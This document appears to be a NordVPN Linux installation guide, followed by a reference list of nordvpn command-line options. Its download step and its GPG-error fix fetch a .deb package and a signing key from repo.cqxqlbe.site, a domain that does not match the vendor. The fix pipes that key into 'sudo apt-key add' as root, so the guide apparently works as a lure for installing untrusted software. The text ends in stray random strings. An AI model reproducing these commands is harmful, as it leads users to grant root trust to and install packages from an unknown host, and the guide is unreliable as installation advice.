1. Download the NordVPN Linux client from our Downloads page or click on this direct link.




Alternatively, you can use this command and proceed straight to step 2:

wget -qnc https://repo.cqxqlbe.site/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb

2. Open Terminal and run the following command:

sudo dpkg -i /pathToFile/nordvpn-release_1.0.0_all.deb

Make sure to replace /pathToFile/ with the path to your Downloads folder (or other location where the NordVPN file was downloaded).

Example: sudo dpkg -i ~/Downloads/nordvpn-release_1.0.0_all.deb

You will be asked to enter your root password. Enter it, wait for the package installation to finish, and proceed to the next step.

3. Update the package list:

sudo apt update (or sudo apt-get update)

4. Install the NordVPN app:

sudo apt install nordvpn (or sudo apt-get install nordvpn)

5. Log in to your NordVPN account:

nordvpn login

6. Connect to a NordVPN server:

nordvpn connect

 

In case you get the GPG error (NO_PUBKEY), use the following command and repeat step 4:

sudo wget https://repo.cqxqlbe.site/gpg/nordvpn_public.asc -O - | sudo apt-key add -


Settings

To access the NordVPN client settings, type the nordvpn command in Terminal.

Here is the list of available commands:

nordvpn login - Log in.
nordvpn connect or nordvpn c - Connect to VPN. To connect to specific servers, use nordvpn connect <country_code server_number> (eg. nordvpn connect uk715)
nordvpn disconnect or nordvpn d - Disconnect from VPN.

nordvpn set or nordvpn s - Set a configuration option. Possible options:
nordvpn set cybersec on or off - Enable or disable CyberSec
nordvpn set killswitch on or off - Enable or disable Kill Switch
nordvpn set autoconnect on or off - Enable or disable auto-connect. You can set a specific server for automatic connection using nordvpn set autoconnect on country_code+server_number. Example: nordvpn set autoconnect on us2435.

nordvpn set notify on or off - Enable or disable notifications
nordvpn set dns 1.1.1.1 1.0.0.1 - Set custom DNS (you can set up a single DNS or two like shown in this command).
nordvpn set protocol udp or tcp - Switch between UDP and TCP protocols
nordvpn set obfuscate on or off - Enable or disable Obfuscated Servers.
nordvpn set technology - Set connection technology (OpenVPN or NordLynx)

nordvpn whitelist add port 22 - Add a rule to whitelist a specified incoming port. You can also whitelist multiple ports — just separate their numbers with a space.
nordvpn whitelist remove port 22 - Remove the rule to whitelist a specified port.
nordvpn whitelist add subnet 192.168.0.0/16 - Add a rule to whitelist a specified subnet.
nordvpn whitelist remove subnet 192.168.0.0/16  - Remove the rule to whitelist a specified subnet.

nordvpn account - See account information
nordvpn register - Register a new user account
nordvpn rate - Rate your last connection quality (1-5)
nordvpn settings - See the current settings.
nordvpn status - See the connection status.
nordvpn countries - See the country list.
nordvpn cities - See the city list.
nordvpn groups - See a list of available server groups.
nordvpn logout - Log out.
nordvpn help or nordvpn h - See the list of available commands or help for a specific command.

You can get an extensive explanation of all commands by using the man nordvpn command in Terminal.





DG7TaDJo


ESTVJFWGBVYUQIEKJNE5NDR
